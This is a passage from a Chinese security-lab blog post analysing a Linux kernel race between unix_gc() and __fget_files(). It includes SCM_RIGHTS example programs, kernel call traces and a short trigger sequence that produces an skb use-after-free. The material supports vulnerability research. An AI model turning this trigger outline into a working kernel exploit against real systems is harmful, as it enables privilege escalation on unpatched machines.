<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="IceSword Lab | 冰刃实验室">
<meta property="og:type" content="website">
<meta property="og:title" content="IceSword Lab">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="IceSword Lab | 冰刃实验室">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="index.html">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/research">Research</a>
        
          <a class="main-nav-link" href="/vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="/recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-2023/03/10/race_windown" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2023/03/10/race_windown/" class="article-date">
  <time datetime="2023-03-10T14:00:00.000Z" itemprop="datePublished">2023-03-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: 熊潇 of <a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener">IceSword Lab</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>原文: <strong><a href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html" target="_blank" rel="noopener">Racing against the clock – hitting a tiny kernel race window</a></strong></p>
<ul>
<li>Part.1: 漏洞原理简述</li>
<li>Part.2: 对比较容易产生疑惑的地方增加了细节说明</li>
<li>Part.3: 针对文中提高 race 的技巧做了分析</li>
</ul>
<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part.1"></a>Part.1</h2><p><strong>The bug &amp; race</strong> </p>
<blockquote>
<p>The kernel tries to figure out whether it can account for all references to some file by comparing the file’s refcount with the number of references from inflight SKBs (socket buffers). If they are equal, it assumes that the UNIX domain sockets subsystem effectively has exclusive access to the file because it owns all references.</p>
<p>The problem is that struct file can also be referenced from an RCU read-side critical section (which you can’t detect by looking at the refcount), and such an RCU reference can be upgraded into a refcounted reference using <code>get_file_rcu()</code> / <code>get_file_rcu_many()</code> by <code>__fget_files()</code> as long as the refcount is non-zero.</p>
</blockquote>
<ul>
<li><code>unix_gc()</code> 的预期逻辑是: <code>total_refs</code> 和 <code>inflight_refs</code> 相同就可以认为此时 <code>file</code> 是单独占有的，就可以把 <code>skb</code> 和 <code>file</code> 一起 free 掉</li>
<li>下面代码 (3) 在 (1) 和 (2)中间执行则 race 成功</li>
<li>如果 race 没有成功，<code>__fget_files</code> 那里就会发现 <code>f_count</code> 是 0 或者 file 是 NULL</li>
<li>但是如果 race 成功的话，<code>file-&gt;f_count</code> 在 <code>__fget_files()</code> 中会被加 1 ，在 <code>unix_gc</code> 后面的代码中就不会被释放 <code>file</code> 的内存，而只是把 <code>f_count</code> 减 1，这也意味着在 <code>close()</code> 之后依然可以 <code>dup()</code> 成功</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dup() -&gt; __fget_files()</span><br><span class="line">    file = files_lookup_fd_rcu(files, fd); <span class="comment">// fdt-&gt;fd[fd] (1)</span></span><br><span class="line">    ...</span><br><span class="line">    get_file_rcu_many(file, refs) <span class="comment">// update: f_count+1 (2)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>() -&gt; unix_gc()</span><br><span class="line">		list_for_each_entry_safe(u, next, &amp;gc_inflight_list, link) &#123;</span><br><span class="line">	    total_refs = file_count(u-&gt;sk.sk_socket-&gt;file);  <span class="comment">// read f_count: 1 (3)</span></span><br><span class="line">	    inflight_refs = atomic_long_read(&amp;u-&gt;inflight);  <span class="comment">// inflight_refs: 1</span></span><br><span class="line">	    ...</span><br><span class="line">			<span class="keyword">if</span> (total_refs == inflight_refs) &#123; <span class="comment">// compare </span></span><br><span class="line">				list_move_tail(&amp;u-&gt;link, &amp;gc_candidates);</span><br><span class="line">		        ...</span><br></pre></td></tr></table></figure>

<p><strong>unix_gc() 中 file 和 skb 没有同步释放可能造成的影响？</strong></p>
<p>下面这个方式可以触发 skb UAF: </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">socketpair() <span class="comment">// 获取 socket pair fds: 3, 4</span></span><br><span class="line">sendmsg(<span class="number">4</span>, <span class="number">3</span>)  <span class="comment">// 通过 fd 4 发送 fd 3</span></span><br><span class="line">	-&gt; skb_queue_tail(&amp;other-&gt;sk_receive_queue, skb); <span class="comment">// other 是 fd 4 的 peer 也就是 fd 3， skb 保存了 fd 4 发送的内容也是 fd 3</span></span><br><span class="line"><span class="built_in">close</span>(<span class="number">3</span>) | dup(<span class="number">3</span>) <span class="comment">// close 和 dup 存在 race，dup 如果 race 成功会返回 fd  3</span></span><br><span class="line">recvmsg(<span class="number">3</span>)  <span class="comment">// 通过 fd 3 接收 fd 4 发送的 skb</span></span><br><span class="line">	-&gt; last = skb = skb_peek(&amp;sk-&gt;sk_receive_queue); <span class="comment">// 此时 skb 对应的内存已经被 free 了</span></span><br></pre></td></tr></table></figure>

<p>skb uaf:</p>
<ul>
<li>allocated in: <code>sendmsg() -&gt; unix_stream_sendmsg()</code></li>
<li>freed in: <code>close() -&gt; unix_gc()</code></li>
<li>uafed in: <code>recvmsg() -&gt; unix_stream_read_generic()</code></li>
</ul>
<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part.2"></a>Part.2</h2><h3 id="SCM-RIGHTS-unix-socket"><a href="#SCM-RIGHTS-unix-socket" class="headerlink" title="SCM_RIGHTS unix socket"></a>SCM_RIGHTS unix socket</h3><blockquote>
<p><code>SCM_RIGHTS</code> is a <strong>socket control message</strong> used for <strong>passing file descriptors</strong> between processes over a UNIX domain socket.</p>
<p>It allows a process to send an open file descriptor to another process, which can then use the file descriptor to read or write to the same file or device.</p>
</blockquote>
<ul>
<li><p>example</p>
<ul>
<li><p>sender.c</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;file_path&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *file_path = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">"/tmp/file_transfer.sock"</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(sock, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(addr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"connect"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(file_path, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> buf[CMSG_SPACE(<span class="keyword">sizeof</span>(fd))];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> = &#123;</span> .iov_base = <span class="string">"hello"</span>, .iov_len = <span class="number">5</span> &#125;;</span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    msg.msg_control = buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span> = <span class="title">CMSG_FIRSTHDR</span>(&amp;<span class="title">msg</span>);</span></span><br><span class="line">    cmsg-&gt;cmsg_level = SOL_SOCKET;</span><br><span class="line">    cmsg-&gt;cmsg_type = SCM_RIGHTS;</span><br><span class="line">    cmsg-&gt;cmsg_len = CMSG_LEN(<span class="keyword">sizeof</span>(fd));</span><br><span class="line">    *((<span class="keyword">int</span> *) CMSG_DATA(cmsg)) = fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sendmsg(sock, &amp;msg, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendmsg"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>recver.c</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">"/tmp/file_transfer.sock"</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(addr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"bind"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(sock, <span class="number">1</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"listen"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> client_sock = accept(sock, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (client_sock == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"accept"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> = &#123;</span> .iov_base = buf, .iov_len = <span class="keyword">sizeof</span>(buf) &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span></span><br><span class="line">			.msg_iov = &amp;io,</span><br><span class="line">	    .msg_iovlen = <span class="number">1</span></span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> control[CMSG_SPACE(<span class="keyword">sizeof</span>(<span class="keyword">int</span>))];</span><br><span class="line">		msg.msg_control = control;</span><br><span class="line">		msg.msg_controllen = <span class="keyword">sizeof</span>(control);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (recvmsg(client_sock, &amp;msg, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">		    perror(<span class="string">"recvmsg"</span>);</span><br><span class="line">		    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span> = <span class="title">CMSG_FIRSTHDR</span>(&amp;<span class="title">msg</span>);</span></span><br><span class="line">		<span class="keyword">if</span> (cmsg == <span class="literal">NULL</span> || cmsg-&gt;cmsg_type != SCM_RIGHTS) &#123;</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"Invalid message\n"</span>);</span><br><span class="line">		    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> fd = *((<span class="keyword">int</span> *) CMSG_DATA(cmsg));</span><br><span class="line">		<span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">		    perror(<span class="string">"No file descriptor received"</span>);</span><br><span class="line">		    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// Do something with the received file descriptor</span></span><br><span class="line">		<span class="keyword">char</span> buf2[<span class="number">256</span>];</span><br><span class="line">		<span class="keyword">ssize_t</span> bytes_read;</span><br><span class="line">		<span class="keyword">while</span> ((bytes_read = <span class="built_in">read</span>(fd, buf2, <span class="keyword">sizeof</span>(buf2))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buf2);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="built_in">close</span>(client_sock);</span><br><span class="line">		<span class="built_in">close</span>(sock);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ul>
<h3 id="Unix-socket-sendmsg-and-recvmsg"><a href="#Unix-socket-sendmsg-and-recvmsg" class="headerlink" title="Unix socket sendmsg() and recvmsg()"></a>Unix socket <code>sendmsg()</code> and <code>recvmsg()</code></h3><ul>
<li>用于发送和接收 <code>SCM_RIGHTS</code> unix socket 数据的主要处理函数是: <code>unix_stream_sendmsg</code> 和 <code>unix_stream_read_generic</code></li>
<li>特殊的地方在于：<ul>
<li><code>sendmsg</code> 的时候会创建 <code>skb</code> 并放在全局列表 <code>gc_inflight_list</code> 和接收端的  <code>sk_receive_queue</code> 上</li>
<li>发送的 <code>fd</code> 对应的 <code>file</code> 会绑定到 <code>skb</code> 上(<code>f_count</code> 也会加 1)</li>
<li><code>recvmsg</code> 的时候从 <code>sk_receive_queue</code> 取 <code>skb</code></li>
<li><code>unix_gc</code> 则从 <code>gc_inflight_list</code> 取 <code>skb</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// net/socket.c</span></span><br><span class="line">sendmsg() -&gt; __sys_sendmsg() -&gt; sock_sendmsg()-&gt; sock_sendmsg_nosec() </span><br><span class="line">	-&gt; <span class="comment">// sock-&gt;ops-&gt;sendmsg</span></span><br><span class="line">     unix_stream_sendmsg() <span class="comment">// struct unix_stream_ops </span></span><br><span class="line">        **__scm_send()** </span><br><span class="line">            scm_fp_copy()</span><br><span class="line">                fget_raw(fd)</span><br><span class="line">										...</span><br><span class="line">	                __fget_files() <span class="comment">// 每个被传递的 fd 引用加 1</span></span><br><span class="line">        other = unix_peer(sk);</span><br><span class="line">        skb = sock_alloc_send_pskb()</span><br><span class="line">        **unix_scm_to_skb()**</span><br><span class="line">            unix_attach_fds() <span class="comment">// fd 与 skb 绑定</span></span><br><span class="line">                unix_inflight()</span><br><span class="line">	                list_add_tail(&amp;u-&gt;link, &amp;**gc_inflight_list**); <span class="comment">// unix_gc 处理的队列 </span></span><br><span class="line">						 **skb-&gt;destructor = unix_destruct_scm;** <span class="comment">// 注册 skb destruct</span></span><br><span class="line">****        skb_queue_tail(&amp;other-&gt;**sk_receive_queue**, skb); <span class="comment">// skb 直接放到 peer 的 sk_receive_queue 队列上</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">recvmsg() -&gt; __sys_recvmsg() -&gt; ...</span><br><span class="line">	-&gt; <span class="comment">// sock-&gt;ops-&gt;recvmsg</span></span><br><span class="line">     unix_stream_recvmsg()</span><br><span class="line">        unix_stream_read_generic()</span><br><span class="line">            last = skb = skb_peek(&amp;sk-&gt;sk_receive_queue);<span class="comment">// 取 skb</span></span><br><span class="line">            scm_recv() <span class="comment">// 处理 fd</span></span><br><span class="line">                scm_detach_fds()</span><br><span class="line">											receive_fd_user() <span class="comment">// 接收 fd</span></span><br><span class="line">												..</span><br><span class="line">													fd_install(new_fd, get_file(file));</span><br><span class="line">                    __scm_destroy() <span class="comment">// 释放 skb 绑定的 fd 引用</span></span><br><span class="line">                        fput()</span><br><span class="line">                          fput_many()</span><br></pre></td></tr></table></figure>

<p><code>**struct sk_buff *skb</code>, <code>struct unix_sock *u</code>, <code>struct socket *sock</code>, <code>struct sock *sk</code> 和 <code>struct file *file</code> 之间的关系？**</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span> = &amp;<span class="title">container_of</span>(<span class="title">file</span>-&gt;<span class="title">f_inode</span>, </span></span><br><span class="line"><span class="class">																<span class="title">struct</span> <span class="title">socket_alloc</span>, <span class="title">vfs_inode</span>)-&gt;<span class="title">socket</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">unix_sock</span> *<span class="title">u</span> = (<span class="title">struct</span> <span class="title">unix_sock</span> *)<span class="title">sk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">file</span> *<span class="title">file</span> = <span class="title">u</span>-&gt;<span class="title">sk</span>.<span class="title">sk_socket</span>-&gt;<span class="title">file</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">file</span> *<span class="title">file</span> = (*(<span class="title">struct</span> <span class="title">unix_skb_parms</span> *)&amp;((<span class="title">skb</span>)-&gt;<span class="title">cb</span>)).<span class="title">fp</span>-&gt;<span class="title">fp</span>[<span class="title">i</span>]</span></span><br></pre></td></tr></table></figure>

<h3 id="unix-gc-做了什么？"><a href="#unix-gc-做了什么？" class="headerlink" title="unix_gc() 做了什么？"></a><code>unix_gc()</code> 做了什么？</h3><ul>
<li>遍历 <code>gc_inflight_list</code> 获取 <code>unix_sock</code> 对象<ul>
<li>把满足条件的 <code>unix_sock</code> 添加到 <code>gc_candidates</code></li>
<li>条件：<code>unix_sock</code> 的文件引用和 <code>skb</code> 引用值相同</li>
</ul>
</li>
